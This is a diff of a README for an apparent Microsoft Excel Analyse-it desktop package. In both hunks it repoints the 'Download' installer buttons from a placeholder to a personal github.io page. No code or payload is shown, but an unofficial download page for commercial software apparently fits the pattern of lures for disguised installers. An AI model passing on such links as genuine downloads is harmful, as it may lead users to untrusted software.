@@ -17,7 +17,7 @@ A single Microsoft Excel Analyse-it on Windows deployment covers both portable a
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://brettcole-byte56.github.io/microsoft-excel-analyse-it-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ A portable copy and an installed copy can coexist on the same machine because wo
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://brettcole-byte56.github.io/microsoft-excel-analyse-it-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
